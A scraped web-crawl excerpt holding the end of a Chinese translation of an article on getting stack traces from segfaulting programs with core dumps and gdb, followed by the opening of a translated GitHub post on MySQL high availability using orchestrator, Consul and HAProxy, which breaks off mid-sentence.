crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sysctl kernel.core_pattern\r\nkernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623042334ff508241998-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623042334ff508241998-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623042334ff508241998-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623042334ff508241998-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sysctl </span><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">core_pattern</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623042334ff508241998-2\"><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">core_pattern</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">P</span></div><div class=\"crayon-line\" id=\"crayon-5b623042334ff508241998-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>这引起了我的迷惑（这 apport 是干什么的，它对我的核心转储做了什么？）。以下关于这个我了解到的：</p>\n<ul>\n<li>Ubuntu 使用一种叫做 apport 的系统来报告 apt 包有关的崩溃信息。</li>\n<li>设定 <code>kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P</code> 意味着核心转储将被通过管道送给 <code>apport</code> 程序。</li>\n<li>apport 的日志保存在文件 <code>/var/log/apport.log</code> 中。</li>\n<li>apport 默认会忽略来自不属于 Ubuntu 软件包一部分的二进制文件的崩溃信息</li>\n</ul>\n<p>我最终只是跳过了 apport，并把 <code>kernel.core_pattern</code> 重新设置为 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code>，因为我在一台开发机上，我不在乎 apport 是否工作，我也不想尝试让 apport 把我的核心转储留在磁盘上。</p>\n<h3 id=\"toc_7\">现在你有了核心转储，接下来干什么？</h3>\n<p>好的，现在我们了解了 <code>ulimit</code> 和 <code>kernel.core_pattern</code> ，并且实际上在磁盘的 <code>/tmp</code> 目录中有了一个核心转储文件。太好了！接下来干什么？我们仍然不知道该程序为什么会出现段错误！</p>\n<p>下一步将使用 <code>gdb</code> 打开核心转储文件并获取堆栈调用序列。</p>\n<h3 id=\"toc_8\">从 gdb 中得到堆栈调用序列</h3>\n<p>你可以像这样用 <code>gdb</code> 打开一个核心转储文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b62304233506053084219\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gdb -c my_core_file\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b62304233506053084219-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b62304233506053084219-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b62304233506053084219-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gdb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">my_core</span><span class=\"crayon-sy\">_</span>file</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b62304233506053084219-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>接下来，我们想知道程序崩溃时的堆栈是什么样的。在 <code>gdb</code> 提示符下运行 <code>bt</code> 会给你一个调用序列backtrace。在我的例子里，<code>gdb</code> 没有为二进制文件加载符号信息，所以这些函数名就像 “??????”。幸运的是，（我们通过）加载符号修复了它。</p>\n<p>下面是如何加载调试符号。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6230423350e748646153\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsymbol-file /path/to/my/binary\r\nsharedlibrary\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6230423350e748646153-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6230423350e748646153-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6230423350e748646153-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6230423350e748646153-1\"><span class=\"crayon-v\">symbol</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">path</span><span class=\"crayon-o\">/</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">my</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">binary</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6230423350e748646153-2\"><span class=\"crayon-i\">sharedlibrary</span></div><div class=\"crayon-line\" id=\"crayon-5b6230423350e748646153-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这从二进制文件及其引用的任何共享库中加载符号。一旦我这样做了，当我执行 <code>bt</code> 时，gdb 给了我一个带有行号的漂亮的堆栈跟踪！</p>\n<p>如果你想它能工作，二进制文件应该以带有调试符号信息的方式被编译。在试图找出程序崩溃的原因时，堆栈跟踪中的行号非常有帮助。:)</p>\n<h3 id=\"toc_9\">查看每个线程的堆栈</h3>\n<p>通过以下方式在 <code>gdb</code> 中获取每个线程的调用栈！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b62304233511720050783\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nthread apply all bt full\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b62304233511720050783-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b62304233511720050783-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b62304233511720050783-1\"><span class=\"crayon-e\">thread </span><span class=\"crayon-e\">apply </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">bt </span><span class=\"crayon-i\">full</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b62304233511720050783-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_10\">gdb + 核心转储 = 惊喜</h3>\n<p>如果你有一个带调试符号的核心转储以及 <code>gdb</code>，那太棒了！您可以上下查看调用堆栈（LCTT 译注：指跳进调用序列不同的函数中以便于查看局部变量），打印变量，并查看内存来得知发生了什么。这是最好的。</p>\n<p>如果您仍然正在基于 gdb 向导来工作上，只打印出栈跟踪与bt也可以。 :)</p>\n<h3 id=\"toc_11\">ASAN</h3>\n<p>另一种搞清楚您的段错误的方法是使用 AddressSanitizer 选项编译程序（“ASAN”，即 <code>$CC -fsanitize=address</code>）然后运行它。 本文中我不准备讨论那个，因为本文已经相当长了，并且在我的例子中打开 ASAN 后段错误消失了，可能是因为 ASAN 使用了一个不同的内存分配器（系统内存分配器，而不是 tcmalloc）。</p>\n<p>在未来如果我能让 ASAN 工作，我可能会多写点有关它的东西。（LCTT 译注：这里指使用 ASAN 也能复现段错误）</p>\n<h3 id=\"toc_12\">从一个核心转储得到一个堆栈跟踪真的很亲切！</h3>\n<p>这个博客听起来很多，当我做这些的时候很困惑，但说真的，从一个段错误的程序中获得一个堆栈调用序列不需要那么多步骤：</p>\n<ol>\n<li>试试用 <code>valgrind</code></li>\n</ol>\n<p>如果那没用，或者你想要拿到一个核心转储来调查：</p>\n<ol>\n<li>确保二进制文件编译时带有调试符号信息；</li>\n<li>正确的设置 <code>ulimit</code> 和 <code>kernel.core_pattern</code>；</li>\n<li>运行程序；</li>\n<li>一旦你用 <code>gdb</code> 调试核心转储了，加载符号并运行 <code>bt</code>；</li>\n<li>尝试找出发生了什么！</li>\n</ol>\n<p>我可以使用 <code>gdb</code> 弄清楚有个 C++ 的虚表条目指向一些被破坏的内存，这有点帮助，并且使我感觉好像更懂了 C++ 一点。也许有一天我们会更多地讨论如何使用 <code>gdb</code> 来查找问题！</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114211\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114211votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114211\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"}
{"url_object_id": "b88c57937f3bff3e9546fbbb3ad0988e", "title": ["GitHub 的 MySQL 高可用性实践分享"], "url": "http://blog.jobbole.com/114200/", "create_date": "2018/07/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/e4ff41fe57fa22949c5909f50e5b2ca6.jpg"], "praise_nums": "2", "comment_nums": 0, "fav_nums": 2, "tags": "IT技术, MySQL, 高可用", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://githubengineering.com/mysql-high-availability-at-github/\">shlomi-noach </a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/mysql-high-availability-at-github?print\">oschina</a>   </div><div>\n<p>GitHub 使用 MySQL 作为所有非 git 仓库数据的主要存储, 它的可用性对 GitHub 的访问操作至关重要。GitHub 站点本身、GitHub 的 API、身份验证等等都需要进行数据库访问。我们运行着多个 MySQL 集群来为不同的服务和任务提供支持。我们的集群使用经典的主从配置, 主集群中的某个节点能够接受写入。其余的从集群节点异步同步来自主服务器的更改, 并提供数据的读取服务。</p>\n<p>主节点的可用性尤为重要。没有主服务器, 集群无法接受写入：任何需要保留的写入数据都不能持久化保存，任何传入的更改（如提交、问题、用户创建、审阅、新存储库等）都将失败。</p>\n<p>为了支持写操作，我们显然需要有一个可用的数据写入节点，一个主集群。但同样重要的是，我们需要能够识别或找到该节点。</p>\n<p>在一个写入失败，提示说主节点崩溃的场景中，我们必须确保能启用一个新的主节点，并快速表明其身份。检测故障所需的时间、进行故障转移并公布新的主节点所花费的时间，构成了总的停机时间。</p>\n<p>本文将介绍 GitHub 的 MySQL 高可用性和主服务发现解决方案，它使我们能够可靠地运行跨数据中心操作，容忍数据中心隔离，并使得出现故障时耗费的停机时间变得更短。</p>\n<h2>高可用目标</h2>\n<p>本文描述的解决方案，迭代并改进了之前在 GitHub 实现的高可用(HA)解决方案。随着规模的扩大，MySQL 的高可用策略必须适应变化。我们希望为 GitHub 中的 MySQL 和其他服务，提供类似的高可用策略。</p>\n<p>在考虑高可用和服务发现时，有些问题可以引导你找到合适的解决方案。包含但不限于：</p>\n<ul>\n<li>你能容忍多长的中断时间？</li>\n<li>崩溃检测的可靠性如何？你能容忍错误报告（过早的故障转移）吗？</li>\n<li>故障转移的可靠性如何？什么情况下可以失败？</li>\n<li>解决方案在跨数据中心的场景下效果如何？在低延迟和高延迟的网络情况下如何？</li>\n<li>解决方案是否允许一个完整的数据中心故障或者出现网络隔离？</li>\n<li>有没有防止或缓解脑裂（两台服务器都宣称是某个集群的主节点，不知情对方的存在，并且都能接受写操作）的机制。</li>\n<li>你能允许数据丢失吗？在多大程度上？</li>\n</ul>\n<p>为了说明上面的一些情况，首先让我们讨论一下之前的高可用方案，并说说我们为什么要修改它。</p>\n<h2>移除基于 VIP 和 DNS 的服务发现</h2>\n<p>在之前的迭代版本中，我们：</p>\n<ul>\n<li>使用 <a href=\"https://githubengineering.com/orchestrator-github/\" rel=\"nofollow\">orchestrator</a> 来做检测和故障转移</li>\n<li>使用 VIP 和 DNS 做主节点的发现</li>\n</ul>\n<p>在这个迭代版本中，客户端使用名字服务（比如 mysql-writer-1.github.net）来发现写节点。名字可以解析为一个虚拟 IP(VIP)，这个 VIP 指向主节点。</p>\n<p>因此，在正常情况下，客户端只需要解析名称，连接到解析后的 IP上，然后发现主节点也正在另一边监听链接（也就是客户端连上了主节点）。</p>\n<p>考虑这个跨越三个不同数据中心的复制拓扑：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/e752113fd43657ff8cf09024a4f5d777.png\" alt=\"\"></p>\n<p>当主节点发生故障时，必须在副本集中选出一个服务器，提升为新的主节点。</p>\n<p>orchestrator 将会检测到故障，选举出一个新的主节点，然后重新分配 name（名称）和 VIP（虚拟 IP）。客户端实际上并不知道主节点的真实身份：它们只知道 name（名字），而这个名字现在必须解析给新的主节点。不过，需要考虑：</p>\n<p>VIP 是需要协作的：它们由数据库服务器自己声明和拥有。为了获得或释放 VIP，服务器必须发送 ARP 请求。拥有 VIP 的服务器必须在新提升的主节点获得 VIP 之前先释放掉。这还有一些额外的影响：</p>\n<ul>\n<li>有秩序的故障转移操作会首先通知故障主节点并要求它释放 VIP，然后再通知新提升的主节点并要求它获取 VIP。如果无法通知到原主节点或者拒绝释放 VIP 怎么办？首先要考虑到，该服务器上存在故障场景，它不可能会不及时响应，或根本不响应。\n<ul>\n<li>我们最终可能会出现脑裂情况：两个注解同时声称拥有同一个 VIP。根据最短的网络路径，不同的客户端可能会连接到不同的服务器。</li>\n<li>事实源于两个独立服务器间的协作，并且这个设置是不可靠的。</li>\n</ul>\n</li>\n<li>即使原主节点确实配合，工作流程也浪费了宝贵的时间：当我们通知原主节点时，切换到新主节点的操作一直在等待。</li>\n<li>即使 VIP 发生变化，现有的客户端连接也不能保证与原服务器断开连接，而且我们可能仍然会经历脑裂。</li>\n</ul>\n<p>VIP 受限于物理位置。它们属于交换机或者路由器。所以，我们只能将 VIP 重新分配到位于同一位置的服务器上。特别是，当新提升的服务器位于不同的数据中心时，我们无法分配 VIP，只能修改 DNS。</p>\n<ul>\n<li>修改 DNS 需要较长的传播时间。根据配置，客户端会缓存 DNS 一段时间。跨数据中心(cross-DC)故障转移则意味着更多的中断时间：为了让所有客户端知晓新主节点的身份，需要花费更长的时间。</li>\n</ul>\n<p>仅这些限制，就足以促使我们寻求新的解决方案，但考虑更多的是：</p>\n<ul>\n<li>主节点通过 pt-heartbeat 心跳服务进行自行注入，目的是<a href=\"https://githubengineering.com/mitigating-replication-lag-and-reducing-read-load-with-freno/\" target=\"_blank\" rel=\"nofollow\">测量延迟和节流</a>。这项服务必须从新提升的主节点开始。如果有可能的话，原主节点的服务将被关闭。</li>\n<li>同样的，<a href=\"https://github.com/github/orchestrator/blob/master/docs/pseudo-gtid.md\" rel=\"nofollow\">Pseudo-GTID</a> 注入也是主节点自己管理的。它将从新的主节点开始，并在原主节点结束。</li>\n<li>新的主节点被设为可写。如果可能的话，原主节点被设为只读。</li>\n</ul>\n<p>这些额外的步骤是导致中断总时间的一个因素，并且引入了它们自己的故障和摩擦。</p>\n<p>该解决方案生效了，GitHub 已经成功完成 MySQL 的故障迁移，但我们希望我们的 HA 在以下方面有所改进：</p>\n<ul>\n<li>数据中心不可知</li>\n<li>允许数据中心出现故障</li>\n<li>删除不可靠的协作工作流</li>\n<li>减少总的中断时间</li>\n<li>尽可能地进行无损故障转移</li>\n</ul>\n<h2>GitHub 的高可用解决方案：orchestrator, Consul, GLB</h2>\n<p>我们的新策略，除了附带的改进外，还解决或减轻了上面的许多问题。在今天的高可用设置中，我们有：</p>\n<ul>\n<li>使用 <a href=\"https://github.com/github/orchestrator\" target=\"_blank\" rel=\"nofollow\">orchestrator</a> 来做监测和故障转移。我们使用跨数据中心的 <a href=\"https://github.com/github/orchestrator/blob/master/docs/raft.md\" rel=\"nofollow\">orchestrator/raft</a> 方案，如下图。</li>\n<li>使用 Hashicorp 的 <a href=\"https://www.consul.io/\" rel=\"nofollow\">Consul</a> 来做服务发现。</li>\n<li>使用 <a href=\"https://githubengineering.com/introducing-glb/\" target=\"_blank\" rel=\"nofollow\">GLB/HAProxy</a> 作为客户端和写节点的代理层。</li>\n<li>使用选播(anycast)做网络路由。</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6d28cf7c2b62e1601cd4f817cbf54740.png\" alt=\"\"></p>\n<p>新的设置将完全删除 VIP 和 DNS 的修改。在我们引入更多组件的同时，我们能够将组件解耦并简化任务，并且能够使用可靠、稳定的解决方案。下面逐一分析。</p>\n<h3>正常流程</h3>\n<p>正常情况下，应用程序通过 GLB/HAProxy 连接到写节点。</p>\n<p>应用程序永远不知道主节点的身份。和之前一样，它们使用名字。例如，cluster1 的主节点命名为 mysql-writer-1.github.net。在我们当前的设置中，名字被解析为一个选播(<a href=\"https://en.wikipedia.org/wiki/Anycast\" target=\"_blank\" rel=\"nofollow\">anycast</a>) IP。</p>\n<p>使用选播时，名字在任何地方都被解析为相同的 IP，但流量会根据客户端位置的不同进行路由。需要指出的是，在我们的每个数据中心，都有 GLB（我们的高可用负载均衡）被部署在不同的容器中。指向 mysql-writer-1.github.net 的流量总是路由到本地数据中心的 GLB 集群。因此，所有客户端都由本地代理提供服务。</p>\n<p>我们在 <a href=\"https://www.haproxy.com/\" rel=\"nofollow\">HAProxy</a> 上运行 GLB。我们的 HAProxy 维护了一个写连接池：每个 MySQL 集群一个连接池，其中每个连接池只有一个后端服务器：集群的主节点。DC 中的所有 GLB/HAProxy 容器都具有相同的连接池，并且它们都指向相同的后端服务器。这样，如果一个应用程序想要写入 mysql-writer-1.github.net，它连接到哪个 GLB 服务器并不重要。它总会被路由到实际的 cluster1 主节点上。</p>\n<p>对于应用程序而言，服务发现结束于 GLB，并且不再需要重新发现。就这样，通过 GLB 将流量路由到正确地址。</p>\n<p>GLB 如何知道哪些服务器可以作为后端服务器，以及如何将更改传播到 GBL 呢？</p>\n<h3><strong>Consul 的服务发现</strong></h3>\n<p>Consul 是著名的服务发现解决方案，它也提供 DNS 服务。然而，在我们的解决方案中，我们用它作为高效的键值存储系统。</p>\n<p>在 Consul 的键值存储中，我们写入了集群主控的标识。对于每一个集群，都有一个键值对记录标识集群的主 FQDN，端口，IPV4，IPV6。</p>\n<p>每一个 GLB/HAProxy 节点都运行 consul 模板：每一个服务都在监听 consul 数据的变更（这里主要是对集群主控的数据变更）。consul 模板会生成一个有效的配置文件并且当配置变更时，能够自动重载 HAProxy。</p>\n<p>因此，Consul 中主控标识的变更会被每一个 GLB/HAProxy 观察到，然后它们立即重新配置它们自己，在集群后端池中设置新的主控作为单一对象，并且进行重载以反映这些变更。</p>\n<p>在 GitHub 中，每一个数据中心都有一个 Consul 设置，并且每一个设置都具有高可用性。然而，这些设置又互相独立，它们之间不进行互相复制或数据共享。</p>\n<p>那么 Consul 是如何获得变更通知，在交叉数据中心中，信息又是如何分布的呢？</p>\n<h3>orchestrator/raft</h3>\n<p>运行一个 orchestrator/raft 设置：orchestrator 节点之间通过 raft 一致性算法进行通信。每一个数据中心有 1~2 个 orchestrator 节点。</p>\n<p>orchestrator 负责失败检测，MySQL 故障转移，以及 Consul 主控的变更通知。故障转移通过单个 orchestrator/raft 主导节点进行操作，但是对于主控变更，产生新主控的消息会通过 raft 机制被传播到所有 orchestrator 节点。</p>\n<p>一旦 orchestrator 节点接收到主控变更的消息，它们会与自己对应的本地 